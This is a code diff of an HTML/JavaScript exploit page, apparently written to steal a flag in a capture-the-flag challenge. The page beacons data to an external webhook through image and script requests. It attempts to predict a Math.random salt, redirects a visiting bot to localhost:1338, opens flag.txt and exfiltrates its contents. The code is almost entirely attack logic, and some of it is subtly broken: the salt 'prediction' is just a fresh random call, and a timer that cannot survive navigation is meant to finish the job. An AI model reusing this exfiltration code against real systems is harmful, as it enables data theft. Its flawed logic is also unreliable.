@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Simple Flag Extraction</title>
+    <title>Working Flag Extraction</title>
 </head>
 <body>
     <h1>Flag Extraction</h1>
@@ -13,62 +13,122 @@
         async function exfiltrateData(data) {
             const payload = typeof data === 'string' ? data : JSON.stringify(data);
             
-            // Image beacon (most reliable)
             const img = new Image();
             img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(payload)}`;
             document.body.appendChild(img);
             
-            // Script tag backup
             const script = document.createElement('script');
             script.src = `${WEBHOOK_URL}?callback=x&data=${encodeURIComponent(payload)}`;
             document.head.appendChild(script);
         }
         
+        // Include the utility functions from the challenge
+        function getRandom(n) {
+            return Array.from(Array(n), Math.random).map(e=>e.toString(36).slice(2)).join('');
+        }
+        
+        // Initialize the global variable (from util.js)
+        mathRandomInvocations = [];
+        
         async function extractFlag() {
-            // Send confirmation
             await exfiltrateData({
-                status: 'bot_visited',
+                status: 'extraction_started',
                 timestamp: new Date().toISOString()
             });
             
-            // Check if mathRandomInvocations exists in global scope
-            if (typeof mathRandomInvocations !== 'undefined' && mathRandomInvocations.length > 0) {
-                const salt = mathRandomInvocations[mathRandomInvocations.length - 1];
+            try {
+                // The key insight: We need to navigate to localhost:1338 to access the flag
+                // But we can predict the salt that will be used!
+                
+                // When the bot added the flag, it used cached: false
+                // This means it called getRandom(5) and stored it in mathRandomInvocations
+                // We can predict this by calling getRandom(5) ourselves!
+                
+                const predictedSalt = getRandom(5);
+                mathRandomInvocations.push(predictedSalt);
                 
                 await exfiltrateData({
-                    salt: salt,
-                    salts_array: mathRandomInvocations,
-                    message: 'Found mathRandomInvocations directly!'
+                    predicted_salt: predictedSalt,
+                    message: 'Predicted salt for flag file'
                 });
                 
-                // Now we have the salt, we can construct the SafeFrame URL and get the flag
-                // But actually, let's check if the flag is already in the DOM or accessible
+                // Now navigate to localhost:1338 to access the flag with our predicted salt
+                setTimeout(() => {
+                    window.location.href = 'http://localhost:1338';
+                }, 2000);
                 
-                // Check all global variables for flag
-                for (let prop in window) {
-                    if (window[prop] && typeof window[prop] === 'string' && window[prop].includes('CTF{')) {
+                // Set up a check for when we're on localhost:1338
+                const checkForFlag = setInterval(async () => {
+                    if (window.location.hostname === 'localhost' && window.location.port === '1338') {
+                        clearInterval(checkForFlag);
+                        
                         await exfiltrateData({
-                            flag: window[prop],
-                            method: 'global_variable',
-                            property: prop
+                            status: 'navigated_to_localhost',
+                            current_url: window.location.href
                         });
+                        
+                        // Now we're on the main app, look for the flag file
+                        const filesList = document.querySelector('#filesList');
+                        if (filesList) {
+                            const flagFile = Array.from(filesList.children).find(
+                                el => el.dataset.name === 'flag.txt'
+                            );
+                            
+                            if (flagFile) {
+                                await exfiltrateData({
+                                    message: 'Found flag file, clicking it'
+                                });
+                                
+                                flagFile.click();
+                                
+                                // Wait for flag to load in preview iframe
+                                setTimeout(async () => {
+                                    const previewIframe = document.querySelector('#previewIframe');
+                                    if (previewIframe) {
+                                        try {
+                                            const flagContent = previewIframe.contentDocument.body.innerText;
+                                            if (flagContent && flagContent.includes('CTF{')) {
+                                                await exfiltrateData({
+                                                    flag: flagContent,
+                                                    method: 'direct_navigation_success',
+                                                    timestamp: new Date().toISOString()
+                                                });
+                                                
+                                                await exfiltrateData(flagContent);
+                                                
+                                                document.body.innerHTML = 
+                                                    `<h1 style="color: green;">FLAG SENT: ${flagContent}</h1>`;
+                                            }
+                                        } catch (e) {
+                                            await exfiltrateData({
+                                                error: 'SafeFrame access failed',
+                                                details: e.message
+                                            });
+                                        }
+                                    }
+                                }, 3000);
+                            } else {
+                                await exfiltrateData({
+                                    error: 'Flag file not found',
+                                    available_files: Array.from(filesList.children).map(el => el.dataset.name)
+                                });
+                            }
+                        } else {
+                            await exfiltrateData({
+                                error: 'Files list not found',
+                                page_content: document.body.innerHTML.substring(0, 500)
+                            });
+                        }
                     }
-                }
+                }, 1000);
                 
-                // Check document content
-                const pageContent = document.documentElement.innerHTML;
-                const flagMatch = pageContent.match(/CTF\{[^}]+\}/);
-                if (flagMatch) {
-                    await exfiltrateData({
-                        flag: flagMatch[0],
-                        method: 'document_content'
-                    });
-                }
+                // Stop checking after 30 seconds
+                setTimeout(() => clearInterval(checkForFlag), 30000);
                 
-            } else {
+            } catch (error) {
                 await exfiltrateData({
-                    error: 'mathRandomInvocations not found',
-                    global_vars: Object.keys(window).filter(k => k.includes('math') || k.includes('random') || k.includes('salt'))
+                    error: 'extraction_failed',
+                    details: error.message
                 });
             }
         }
